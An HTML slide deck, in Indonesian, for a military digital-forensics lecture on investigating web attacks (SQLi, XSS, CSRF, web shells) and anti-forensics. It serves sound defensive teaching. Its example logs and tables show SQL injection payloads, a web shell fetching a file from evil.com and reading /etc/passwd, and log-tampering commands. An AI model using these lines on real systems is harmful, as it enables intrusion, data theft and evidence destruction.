@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pertemuan 12: Investigasi Serangan Web dan Teknik Anti-Forensik</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reset.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/league.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai.min.css">
+    <link rel="stylesheet" href="../css/unhan-theme.css">
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- ==================== SLIDE 1: TITLE ==================== -->
+            <section class="center">
+                <h1>Forensik Digital</h1>
+                <h3>Pertemuan 12</h3>
+                <h2>Investigasi Serangan Web dan Teknik Anti-Forensik</h2>
+                <p class="small title-meta">Mata Kuliah: Digital Forensic for Military Purposes | 3 SKS</p>
+            </section>
+
+            <!-- ==================== SLIDE 2: LEARNING OUTCOMES ==================== -->
+            <section>
+                <h2>🎯 Capaian Pembelajaran</h2>
+                <p>Setelah pertemuan ini, mahasiswa mampu:</p>
+                <ol class="medium-text">
+                    <li class="fragment">Mengidentifikasi jenis serangan web dan vektor serangannya</li>
+                    <li class="fragment">Menganalisis log web server untuk mendeteksi serangan</li>
+                    <li class="fragment">Melakukan investigasi SQL Injection, XSS, dan CSRF</li>
+                    <li class="fragment">Menjelaskan teknik anti-forensik penyerang</li>
+                    <li class="fragment">Mendeteksi timestamp manipulation dan log tampering</li>
+                    <li class="fragment">Menganalisis steganografi dan data hiding</li>
+                    <li class="fragment">Menerapkan forensic countermeasures</li>
+                </ol>
+            </section>
+
+            <!-- ==================== SLIDE 3: AGENDA ==================== -->
+            <section>
+                <h2>📋 Agenda Hari Ini</h2>
+                <div class="two-columns">
+                    <div>
+                        <h4>Bagian 1: Serangan Web</h4>
+                        <ul class="medium-text">
+                            <li>Arsitektur Aplikasi Web</li>
+                            <li>Format Log Web Server</li>
+                            <li>SQL Injection</li>
+                            <li>XSS dan CSRF</li>
+                            <li>Web Shell Detection</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h4>Bagian 2: Anti-Forensik</h4>
+                        <ul class="medium-text">
+                            <li>Klasifikasi Anti-Forensik</li>
+                            <li>Steganografi</li>
+                            <li>Alternate Data Streams</li>
+                            <li>Timestamp Manipulation</li>
+                            <li>Log Tampering</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 4: WEB APP ARCHITECTURE ==================== -->
+            <section>
+                <h2>🌐 Arsitektur Aplikasi Web</h2>
+                <table class="medium-text">
+                    <tr><th>Lapisan</th><th>Komponen</th><th>Artefak Forensik</th></tr>
+                    <tr class="fragment"><td><strong>Presentation</strong></td><td>Browser, HTML/CSS/JS</td><td>Cache, cookies, history</td></tr>
+                    <tr class="fragment"><td><strong>Application</strong></td><td>Web server, app logic</td><td>Access logs, error logs</td></tr>
+                    <tr class="fragment"><td><strong>Data</strong></td><td>Database server</td><td>Query logs, audit trails</td></tr>
+                </table>
+                <p class="fragment small">Serangan web melintasi beberapa lapisan — korelasi artefak antar lapisan diperlukan</p>
+            </section>
+
+            <!-- ==================== SLIDE 5: WEB SERVERS ==================== -->
+            <section>
+                <h2>🖥️ Web Server Utama</h2>
+                <div class="grid-2x2 medium-text">
+                    <div class="step-box fragment">
+                        <strong>Apache</strong><br>
+                        <span class="small">Log: <code>/var/log/apache2/</code></span>
+                    </div>
+                    <div class="step-box fragment">
+                        <strong>Nginx</strong><br>
+                        <span class="small">Log: <code>/var/log/nginx/</code></span>
+                    </div>
+                    <div class="step-box fragment">
+                        <strong>Microsoft IIS</strong><br>
+                        <span class="small">Log: <code>C:\inetpub\logs\</code></span>
+                    </div>
+                    <div class="step-box fragment">
+                        <strong>💡 Tips</strong><br>
+                        <span class="small">Selalu hash log SEBELUM analisis!</span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 6: APACHE LOG FORMAT ==================== -->
+            <section>
+                <h2>📝 Apache Combined Log Format</h2>
+                <pre><code class="plaintext" style="font-size: 0.5em;">192.168.1.100 - admin [15/Jan/2025:10:23:45 +0700] "GET /admin/dashboard.php HTTP/1.1" 200 4523 "http://example.com/login" "Mozilla/5.0"</code></pre>
+                <table class="small fragment">
+                    <tr><th>Field</th><th>Nilai</th><th>Keterangan</th></tr>
+                    <tr><td>IP</td><td><code>192.168.1.100</code></td><td>Alamat client</td></tr>
+                    <tr><td>Timestamp</td><td><code>[15/Jan/2025:10:23:45]</code></td><td>Waktu request</td></tr>
+                    <tr><td>Request</td><td><code>GET /admin/dashboard.php</code></td><td>Method + URI</td></tr>
+                    <tr><td>Status</td><td><code>200</code></td><td>Response code</td></tr>
+                    <tr><td>User-Agent</td><td><code>Mozilla/5.0...</code></td><td>Info browser</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 7: HTTP STATUS CODES ==================== -->
+            <section>
+                <h2>📊 HTTP Status Code untuk Forensik</h2>
+                <table class="medium-text">
+                    <tr><th>Code</th><th>Arti</th><th>Relevansi</th></tr>
+                    <tr class="fragment"><td><code>200</code></td><td>OK</td><td>Serangan mungkin sukses</td></tr>
+                    <tr class="fragment"><td><code>401</code></td><td>Unauthorized</td><td>Gagal autentikasi</td></tr>
+                    <tr class="fragment"><td><code>403</code></td><td>Forbidden</td><td>Akses ditolak</td></tr>
+                    <tr class="fragment"><td><code>404</code></td><td>Not Found</td><td>Scanning/probing</td></tr>
+                    <tr class="fragment"><td><code>500</code></td><td>Server Error</td><td>SQLi error-based</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 8: SQL INJECTION ==================== -->
+            <section>
+                <h2>💉 SQL Injection (SQLi)</h2>
+                <div class="box-definition">
+                    <strong>SQL Injection</strong> adalah teknik menyisipkan perintah SQL berbahaya melalui input aplikasi web ke database.
+                </div>
+                <ul class="medium-text fragment">
+                    <li>🔓 Kebocoran data sensitif</li>
+                    <li>✏️ Manipulasi data</li>
+                    <li>🖥️ Pengambilalihan server</li>
+                    <li>⚠️ Peringkat atas OWASP Top 10</li>
+                </ul>
+            </section>
+
+            <!-- ==================== SLIDE 9: SQLi TYPES ==================== -->
+            <section>
+                <h2>Jenis SQL Injection</h2>
+                <table class="medium-text">
+                    <tr><th>Jenis</th><th>Teknik</th><th>Deteksi</th></tr>
+                    <tr class="fragment"><td><strong>In-Band</strong></td><td>UNION-based, Error-based</td><td>Payload di URL</td></tr>
+                    <tr class="fragment"><td><strong>Blind</strong></td><td>Boolean, Time-based</td><td>Request berulang</td></tr>
+                    <tr class="fragment"><td><strong>Out-of-Band</strong></td><td>DNS/HTTP lookup</td><td>Sulit dari log web</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 10: SQLi DETECTION ==================== -->
+            <section>
+                <h2>🔍 Deteksi SQLi pada Log</h2>
+                <pre><code class="bash">grep -iE "(union.*select|or.*1.*=.*1|\
+  select.*from|drop.*table|waitfor.*delay)" \
+  /var/log/apache2/access.log</code></pre>
+                <pre class="fragment"><code class="plaintext"># Pola yang dicari:
+/page.php?id=1' OR '1'='1
+/page.php?id=1 UNION SELECT username,password FROM users--
+/page.php?id=1; WAITFOR DELAY '0:0:5'--</code></pre>
+                <p class="fragment small">User-Agent <code>sqlmap</code> = strong indicator serangan otomatis</p>
+            </section>
+
+            <!-- ==================== SLIDE 11: SQLi MILITARY SCENARIO ==================== -->
+            <section>
+                <h2>🎖️ Skenario: SQLi Sistem Logistik Kodam</h2>
+                <pre><code class="plaintext" style="font-size: 0.42em;">172.16.0.100 [08:15:22] "GET /inventory.php?item_id=1' UNION SELECT username,password,NULL FROM admin_users--" 200
+172.16.0.100 [08:15:25] "GET /inventory.php?item_id=1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--" 200
+172.16.0.100 [08:16:01] "GET /inventory.php?item_id=1' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='classified_ops'--" 200</code></pre>
+                <div class="fragment box-warning">
+                    <strong>Analisis:</strong> Enumerasi sistematis dalam 39 detik — kredensial → daftar tabel → tabel operasi rahasia
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 12: XSS ==================== -->
+            <section>
+                <h2>📜 Cross-Site Scripting (XSS)</h2>
+                <div class="box-definition">
+                    <strong>XSS</strong> menyisipkan skrip berbahaya ke halaman web yang dieksekusi browser pengguna lain.
+                </div>
+                <table class="medium-text fragment">
+                    <tr><th>Jenis</th><th>Mekanisme</th><th>Persistensi</th></tr>
+                    <tr><td><strong>Reflected</strong></td><td>Payload di URL</td><td>Tidak persisten</td></tr>
+                    <tr><td><strong>Stored</strong></td><td>Payload di database</td><td>Persisten</td></tr>
+                    <tr><td><strong>DOM-based</strong></td><td>Proses client-side</td><td>Tidak persisten</td></tr>
+                </table>
+                <pre class="fragment"><code class="bash">grep -iE "(&lt;script|javascript:|onerror=|\
+  eval\(|document\.cookie)" access.log</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 13: CSRF ==================== -->
+            <section>
+                <h2>🔄 Cross-Site Request Forgery (CSRF)</h2>
+                <div class="box-definition">
+                    <strong>CSRF</strong> memaksa pengguna terautentikasi mengirim request tanpa sepengetahuannya.
+                </div>
+                <pre class="fragment"><code class="plaintext" style="font-size: 0.48em;">192.168.1.50 - admin [12/Feb:11:30:45] "POST /admin/change_password HTTP/1.1" 302 0 "http://evil-site.com/csrf.html"</code></pre>
+                <p class="fragment small">🚨 <strong>Red flag</strong>: Referer dari domain eksternal pada request POST ke endpoint sensitif!</p>
+            </section>
+
+            <!-- ==================== SLIDE 14: WEB SHELL ==================== -->
+            <section>
+                <h2>🐚 Web Shell Detection</h2>
+                <div class="box-definition">
+                    <strong>Web Shell</strong> = skrip berbahaya yang diunggah untuk akses remote ke server.
+                </div>
+                <pre><code class="bash"># Cari file PHP dengan fungsi berbahaya
+grep -rl "eval\|system\|exec\|passthru" \
+  /var/www/html/ --include="*.php"
+
+# File baru (7 hari terakhir)
+find /var/www/html/ -name "*.php" -mtime -7
+
+# File PHP di direktori upload
+find /var/www/html/uploads/ -name "*.php"</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 15: WEB SHELL LOG ==================== -->
+            <section>
+                <h2>📋 Log Aktivitas Web Shell</h2>
+                <pre><code class="plaintext" style="font-size: 0.48em;">203.0.113.99 [03:15:22] "GET /uploads/x.php?cmd=whoami" 200
+203.0.113.99 [03:15:30] "GET /uploads/x.php?cmd=cat+/etc/passwd" 200
+203.0.113.99 [03:16:01] "GET /uploads/x.php?cmd=wget+http://evil.com/bd+-O+/tmp/bd" 200</code></pre>
+                <ol class="medium-text fragment">
+                    <li><code>whoami</code> → Identifikasi user server</li>
+                    <li><code>cat /etc/passwd</code> → Enumerasi user</li>
+                    <li><code>wget</code> → Download malware tambahan</li>
+                </ol>
+                <div class="fragment box-warning">
+                    <strong>KRITIS:</strong> Remote code execution + post-exploitation aktif!
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 16: LOG ANALYSIS TOOLS ==================== -->
+            <section>
+                <h2>🛠️ Tools Analisis Log</h2>
+                <pre><code class="bash"># Top 20 IP
+awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20
+
+# Distribusi status code
+awk '{print $9}' access.log | sort | uniq -c | sort -rn
+
+# Request error 500
+awk '$9 == 500' access.log
+
+# User-Agent analysis
+awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 17: TRANSITION ==================== -->
+            <section class="center">
+                <h1>⚔️ Bagian 2</h1>
+                <h2>Teknik Anti-Forensik</h2>
+                <p class="medium-text">Memahami cara penyerang menghindari deteksi</p>
+            </section>
+
+            <!-- SLIDE 18: ANTI-FORENSICS DEFINITION -->
+            <section>
+                <h2>🛡️ Apa itu Anti-Forensik?</h2>
+                <div class="box-definition">
+                    <strong>Anti-Forensik</strong> adalah teknik untuk menghindari, menghalangi, atau menyesatkan proses investigasi forensik digital.
+                </div>
+                <table class="medium-text fragment">
+                    <tr><th>Kategori</th><th>Teknik</th><th>Tujuan</th></tr>
+                    <tr><td><strong>Data Hiding</strong></td><td>Steganografi, ADS, enkripsi</td><td>Menyembunyikan data</td></tr>
+                    <tr><td><strong>Artifact Wiping</strong></td><td>Secure delete, log cleaning</td><td>Menghapus jejak</td></tr>
+                    <tr><td><strong>Trail Obfuscation</strong></td><td>Timestomping, spoofing</td><td>Menyesatkan investigasi</td></tr>
+                    <tr><td><strong>Attacks on Tools</strong></td><td>Exploit forensic tools</td><td>Gagalkan proses forensik</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 19: STEGANOGRAPHY ==================== -->
+            <section>
+                <h2>🖼️ Steganografi</h2>
+                <div class="box-definition">
+                    <strong>Steganografi</strong> menyembunyikan informasi rahasia di dalam media yang tampak normal (gambar, audio, video).
+                </div>
+                <table class="medium-text fragment">
+                    <tr><th>Aspek</th><th>Steganografi</th><th>Kriptografi</th></tr>
+                    <tr><td>Tujuan</td><td>Sembunyikan keberadaan</td><td>Lindungi isi pesan</td></tr>
+                    <tr><td>Visibilitas</td><td>Tidak terlihat ada</td><td>Terlihat tapi tak terbaca</td></tr>
+                    <tr><td>Kecurigaan</td><td>Tidak mencurigakan</td><td>Mencurigakan</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 20: LSB STEGANOGRAPHY ==================== -->
+            <section>
+                <h2>🔬 LSB Substitution</h2>
+                <p class="medium-text">Mengganti bit terakhir piksel gambar dengan bit pesan:</p>
+                <pre><code class="plaintext">Piksel asli:      10110100 11001010 01110001
+Bit pesan:         1        0        1
+Piksel modifikasi: 10110101 11001010 01110001
+                        ^
+                   Bit terakhir berubah</code></pre>
+                <p class="fragment small">Perubahan hanya 1/256 per channel warna — tidak terlihat mata manusia</p>
+            </section>
+
+            <!-- ==================== SLIDE 21: STEG DETECTION TOOLS ==================== -->
+            <section>
+                <h2>🔧 Tools Deteksi Steganografi</h2>
+                <table class="medium-text">
+                    <tr><th>Tool</th><th>Fungsi</th></tr>
+                    <tr class="fragment"><td><strong>StegSolve</strong></td><td>Analisis visual layer gambar</td></tr>
+                    <tr class="fragment"><td><strong>zsteg</strong></td><td>Deteksi steg pada PNG/BMP</td></tr>
+                    <tr class="fragment"><td><strong>steghide</strong></td><td>Extract data dari JPEG/BMP</td></tr>
+                    <tr class="fragment"><td><strong>stegseek</strong></td><td>Brute-force password steghide</td></tr>
+                    <tr class="fragment"><td><strong>binwalk</strong></td><td>Deteksi file tersembunyi</td></tr>
+                    <tr class="fragment"><td><strong>exiftool</strong></td><td>Analisis metadata</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 22: STEG COMMANDS ==================== -->
+            <section>
+                <h2>💻 Perintah Deteksi Steganografi</h2>
+                <pre><code class="bash"># Deteksi dengan zsteg
+zsteg suspicious_image.png
+
+# Extract dengan steghide
+steghide extract -sf image.jpg -p ""
+
+# Brute-force password
+stegseek image.jpg wordlist.txt
+
+# Cek file tersembunyi
+binwalk -e suspicious.png
+
+# Cek metadata
+exiftool suspicious.jpg</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 23: ADS ==================== -->
+            <section>
+                <h2>📁 Alternate Data Streams (ADS)</h2>
+                <div class="box-definition">
+                    <strong>ADS</strong> = fitur NTFS yang menyimpan data tersembunyi di dalam file normal. Tidak terlihat di Windows Explorer.
+                </div>
+                <pre class="fragment"><code class="cmd">REM Membuat ADS
+echo "Data rahasia" > dokumen.txt:rahasia.txt
+
+REM Membaca ADS
+more < dokumen.txt:rahasia.txt
+
+REM Deteksi ADS
+dir /R dokumen.txt
+streams.exe -s C:\Users\suspect\
+Get-Item dokumen.txt -Stream *</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 24: ARTIFACT WIPING ==================== -->
+            <section>
+                <h2>🧹 Artifact Wiping</h2>
+                <table class="medium-text">
+                    <tr><th>Metode</th><th>Passes</th><th>Standar</th></tr>
+                    <tr class="fragment"><td>Zero Fill</td><td>1</td><td>-</td></tr>
+                    <tr class="fragment"><td>Random Data</td><td>1</td><td>-</td></tr>
+                    <tr class="fragment"><td>DoD 5220.22-M</td><td>3</td><td>US DoD</td></tr>
+                    <tr class="fragment"><td>Gutmann</td><td>35</td><td>Peter Gutmann</td></tr>
+                    <tr class="fragment"><td>NIST 800-88</td><td>1-3</td><td>NIST</td></tr>
+                </table>
+                <p class="fragment small">💡 Data yang di-wipe TIDAK dapat di-recover, tetapi penggunaan tool wiping itu sendiri meninggalkan jejak!</p>
+            </section>
+
+            <!-- ==================== SLIDE 25: WIPING DETECTION ==================== -->
+            <section>
+                <h2>🔎 Deteksi Wiping Tools</h2>
+                <pre><code class="cmd">REM Cek Prefetch files
+dir C:\Windows\Prefetch\*BLEACHBIT* /S
+dir C:\Windows\Prefetch\*CCLEANER* /S
+dir C:\Windows\Prefetch\*SDELETE* /S
+
+REM Cek registry
+reg query "HKLM\SOFTWARE\...\Uninstall" /s | findstr /i "bleachbit ccleaner eraser"
+
+REM Cek event log (audit cleared)
+wevtutil qe Security /q:"*[System[(EventID=1102)]]"</code></pre>
+                <p class="fragment small">Artefak lain: USN Journal, Volume Shadow Copies, RAM artifacts</p>
+            </section>
+
+            <!-- ==================== SLIDE 26: TIMESTAMP MANIPULATION ==================== -->
+            <section>
+                <h2>⏰ Timestamp Manipulation</h2>
+                <div class="box-definition">
+                    <strong>Timestomping</strong> mengubah metadata waktu file untuk menyesatkan analisis timeline forensik.
+                </div>
+                <table class="medium-text fragment">
+                    <tr><th>Atribut MFT</th><th>Timestamps</th><th>Modifikasi User?</th></tr>
+                    <tr><td><strong>$STANDARD_INFORMATION</strong></td><td>C, M, A, E</td><td>✅ Dapat dimanipulasi</td></tr>
+                    <tr><td><strong>$FILE_NAME</strong></td><td>C, M, A, E</td><td>❌ Tidak bisa (kernel only)</td></tr>
+                </table>
+                <p class="fragment small">🔑 <strong>Key insight:</strong> Bandingkan kedua atribut — jika berbeda = manipulasi!</p>
+            </section>
+
+            <!-- ==================== SLIDE 27: TIMESTAMP DETECTION EXAMPLE ==================== -->
+            <section>
+                <h2>🔍 Deteksi Timestamp Manipulation</h2>
+                <table class="medium-text">
+                    <tr><th>Atribut</th><th>Created</th><th>Modified</th></tr>
+                    <tr><td>$STANDARD_INFO</td><td>2020-01-15 08:00</td><td>2020-01-15 08:00</td></tr>
+                    <tr><td>$FILE_NAME</td><td>2025-02-10 14:23</td><td>2025-02-10 14:23</td></tr>
+                </table>
+                <div class="fragment box-warning">
+                    <strong>Terdeteksi!</strong> $SI menunjukkan 2020, $FN menunjukkan 2025. Timestamp asli = $FILE_NAME (kernel-managed).
+                </div>
+                <pre class="fragment"><code class="bash"># Deteksi dengan MFTECmd
+MFTECmd.exe -f '$MFT' --csv output/ --csvf mft.csv</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 28: LOG TAMPERING ==================== -->
+            <section>
+                <h2>📝 Log Tampering</h2>
+                <table class="medium-text">
+                    <tr><th>Teknik</th><th>Metode</th></tr>
+                    <tr class="fragment"><td><strong>Deletion</strong></td><td><code>rm /var/log/auth.log</code></td></tr>
+                    <tr class="fragment"><td><strong>Selective Edit</strong></td><td><code>sed -i '/IP_attacker/d' access.log</code></td></tr>
+                    <tr class="fragment"><td><strong>Log Rotation Abuse</strong></td><td><code>logrotate -f</code></td></tr>
+                    <tr class="fragment"><td><strong>Timestamp Edit</strong></td><td>Edit langsung waktu entri</td></tr>
+                    <tr class="fragment"><td><strong>Log Injection</strong></td><td>Sisipkan entri palsu</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 29: LOG TAMPERING DETECTION ==================== -->
+            <section>
+                <h2>🔎 Deteksi Log Tampering</h2>
+                <pre><code class="bash"># Cek gap dalam timestamp
+awk '{print $4}' access.log | sed 's/\[//' | \
+  sort | uniq -c | sort -rn
+
+# Cek ukuran file log
+ls -la /var/log/apache2/
+
+# Periksa inode modification time
+stat /var/log/apache2/access.log
+
+# Cek auditd untuk akses log
+ausearch -f /var/log/apache2/access.log
+
+# Bandingkan dengan remote log server</code></pre>
+            </section>
+
+            <!-- ==================== SLIDE 30: FORENSIC COUNTERMEASURES ==================== -->
+            <section>
+                <h2>🛡️ Forensic Countermeasures</h2>
+                <table class="medium-text">
+                    <tr><th>Countermeasure</th><th>Anti-Forensik yang Dicegah</th></tr>
+                    <tr class="fragment"><td><strong>Centralized Logging</strong></td><td>Log tampering</td></tr>
+                    <tr class="fragment"><td><strong>Write-Once Media</strong></td><td>Artifact wiping</td></tr>
+                    <tr class="fragment"><td><strong>File Integrity Monitoring</strong></td><td>Timestamp manipulation</td></tr>
+                    <tr class="fragment"><td><strong>Forensic Readiness</strong></td><td>Semua teknik</td></tr>
+                    <tr class="fragment"><td><strong>Memory Acquisition</strong></td><td>Encryption, data hiding</td></tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 31: CENTRALIZED LOGGING ==================== -->
+            <section>
+                <h2>📡 Centralized Logging</h2>
+                <pre><code class="bash"># rsyslog - kirim log ke server terpusat
+# /etc/rsyslog.d/50-remote.conf
+*.* @@logserver.mil.id:514
+
+# Apache remote logging
+ErrorLog "| /usr/bin/logger -t apache_error -p local0.error"
+CustomLog "| /usr/bin/logger -t apache_access -p local0.info" combined</code></pre>
+                <p class="fragment small">💡 Log di server terpusat tidak dapat dimanipulasi oleh penyerang yang hanya mengkompromikan web server</p>
+            </section>
+
+            <!-- ==================== SLIDE 32: FILE INTEGRITY MONITORING ==================== -->
+            <section>
+                <h2>📊 File Integrity Monitoring</h2>
+                <pre><code class="bash"># AIDE - Advanced Intrusion Detection Environment
+aide --init
+cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
+
+# Periksa integritas
+aide --check
+
+# Output:
+# Changed: /var/log/apache2/access.log
+#   Mtime: 2025-02-15 10:00 -> 14:30
+#   SHA256: abc123... -> def456...</code></pre>
+                <p class="fragment small">Tools lain: Tripwire, OSSEC</p>
+            </section>
+
+            <!-- ==================== SLIDE 33: CASE STUDY ==================== -->
+            <section>
+                <h2>📋 Studi Kasus: Serangan pada Kodam XVII</h2>
+                <div class="box-info">
+                    <strong>Skenario:</strong> Sistem logistik Kodam XVII/Cenderawasih melaporkan anomali 20 Feb 2025
+                </div>
+                <ol class="medium-text fragment">
+                    <li>Lonjakan request dari IP <code>203.0.113.75</code> mulai 02:00 WIT</li>
+                    <li>File PHP baru di <code>/uploads/</code></li>
+                    <li>Gap log antara 03:00-04:00 WIT</li>
+                    <li>File <code>.xlsx</code> dengan timestamp 2019</li>
+                </ol>
+            </section>
+
+            <!-- ==================== SLIDE 34: CASE STUDY TIMELINE ==================== -->
+            <section>
+                <h2>⏱️ Rekonstruksi Timeline</h2>
+                <table class="small">
+                    <tr><th>Waktu</th><th>Aktivitas</th><th>Jenis</th></tr>
+                    <tr class="fragment"><td>02:01</td><td>Akses halaman login</td><td>Reconnaissance</td></tr>
+                    <tr class="fragment"><td>02:05</td><td>Login berhasil</td><td>Credential compromise</td></tr>
+                    <tr class="fragment"><td>02:10</td><td>SQL Injection pada parameter</td><td>SQL Injection</td></tr>
+                    <tr class="fragment"><td>02:15</td><td>Upload file ke server</td><td>Web shell upload</td></tr>
+                    <tr class="fragment"><td>03-04</td><td>Gap pada log (dihapus)</td><td>Log tampering</td></tr>
+                    <tr class="fragment"><td>04:01</td><td>Akses web shell</td><td>Post-exploitation</td></tr>
+                </table>
+                <div class="fragment box-warning">
+                    Anti-forensik terdeteksi: log tampering + timestamp manipulation
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 35: OWASP TOP 10 ==================== -->
+            <section>
+                <h2>🔟 OWASP Top 10 & Forensik</h2>
+                <table class="small">
+                    <tr><th>Rank</th><th>Kerentanan</th><th>Artefak Forensik</th></tr>
+                    <tr class="fragment"><td>A01</td><td>Broken Access Control</td><td>Access log, session data</td></tr>
+                    <tr class="fragment"><td>A03</td><td>Injection</td><td>Query logs, error logs</td></tr>
+                    <tr class="fragment"><td>A07</td><td>Auth Failures</td><td>Auth logs, brute force</td></tr>
+                    <tr class="fragment"><td>A09</td><td>Logging Failures</td><td>Absence of logs!</td></tr>
+                </table>
+                <p class="fragment small">⚠️ A09 Logging Failures = anti-forensik paling efektif — tanpa log, tidak ada bukti!</p>
+            </section>
+
+            <!-- ==================== SLIDE 36: QUIZ ==================== -->
+            <section>
+                <h2>❓ Quiz Interaktif</h2>
+                <p>Dari log berikut, jenis serangan apa yang terjadi?</p>
+                <pre><code class="plaintext" style="font-size: 0.5em;">10.0.0.50 [14:05:33] "GET /users.php?id=1' OR '1'='1 HTTP/1.1" 200 8721 "-" "sqlmap/1.5"</code></pre>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-incorrect')">A. Cross-Site Scripting (XSS)</div>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-correct')">B. SQL Injection</div>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-incorrect')">C. CSRF</div>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-incorrect')">D. Web Shell</div>
+                <p class="fragment small">✅ <strong>B.</strong> Payload <code>' OR '1'='1</code> dan User-Agent <code>sqlmap</code> = SQL Injection</p>
+            </section>
+
+            <!-- ==================== SLIDE 37: QUIZ 2 ==================== -->
+            <section>
+                <h2>❓ Quiz Interaktif 2</h2>
+                <p>Teknik anti-forensik mana yang dapat dideteksi dengan membandingkan $STANDARD_INFORMATION dan $FILE_NAME?</p>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-incorrect')">A. Steganografi</div>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-incorrect')">B. Log Tampering</div>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-correct')">C. Timestamp Manipulation</div>
+                <div class="quiz-option fragment" onclick="this.classList.add('quiz-incorrect')">D. Alternate Data Streams</div>
+                <p class="fragment small">✅ <strong>C.</strong> $FILE_NAME dikelola kernel dan tidak bisa diubah user — perbedaan = timestomping!</p>
+            </section>
+
+            <!-- ==================== SLIDE 38: KEY TAKEAWAYS ==================== -->
+            <section>
+                <h2>📌 Key Takeaways</h2>
+                <ol class="medium-text">
+                    <li class="fragment">Log web server adalah bukti utama investigasi serangan web</li>
+                    <li class="fragment">SQLi, XSS, CSRF memiliki pola unik yang terdeteksi di log</li>
+                    <li class="fragment">Web shell = remote code execution — severity KRITIS</li>
+                    <li class="fragment">Anti-forensik: data hiding, wiping, trail obfuscation</li>
+                    <li class="fragment">Bandingkan $SI vs $FN untuk deteksi timestomping</li>
+                    <li class="fragment">Centralized logging = countermeasure paling efektif</li>
+                </ol>
+            </section>
+
+            <!-- ==================== SLIDE 39: NEXT MEETING ==================== -->
+            <section>
+                <h2>📅 Pertemuan Berikutnya</h2>
+                <div class="box-info">
+                    <h3>Pertemuan 13: Forensik Dark Web dan Investigasi Email</h3>
+                </div>
+                <ul class="medium-text">
+                    <li class="fragment">Dark web investigation techniques</li>
+                    <li class="fragment">Tor network forensics</li>
+                    <li class="fragment">Email header analysis</li>
+                    <li class="fragment">Phishing investigation</li>
+                    <li class="fragment">Cryptocurrency forensics</li>
+                </ul>
+            </section>
+
+            <!-- ==================== SLIDE 40: REFERENCES ==================== -->
+            <section>
+                <h2>📚 Referensi</h2>
+                <ol class="small">
+                    <li>Casey, E. (2022). <em>Digital Evidence and Computer Crime</em>. <strong>Chapter 13</strong></li>
+                    <li>Phillips, A., et al. (2022). <em>Guide to Computer Forensics and Investigations</em>. Chapter 10-11</li>
+                    <li>Harris, R. (2006). <em>Arriving at an Anti-Forensics Consensus</em>. DFRWS</li>
+                    <li>OWASP Web Security Testing Guide</li>
+                    <li>SecRepo: https://www.secrepo.com/</li>
+                    <li>CyberDefenders: https://cyberdefenders.org/</li>
+                </ol>
+            </section>
+
+            <!-- ==================== SLIDE 41: CLOSING ==================== -->
+            <section class="center">
+                <h1>Terima Kasih</h1>
+                <h3>🔍 Forensik Digital untuk Keperluan Militer</h3>
+                <p>Pertemuan 12: Investigasi Serangan Web dan Teknik Anti-Forensik</p>
+                <br>
+                <p class="small">Ada pertanyaan?</p>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/highlight/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/notes/notes.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/math/math.min.js"></script>
+    
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: 'c/t',
+            showSlideNumber: 'all',
+            transition: 'slide',
+            transitionSpeed: 'default',
+            backgroundTransition: 'fade',
+            pdfSeparateFragments: false,
+            plugins: [ RevealHighlight, RevealNotes, RevealMath.KaTeX ]
+        });
+    </script>
+</body>
+</html>
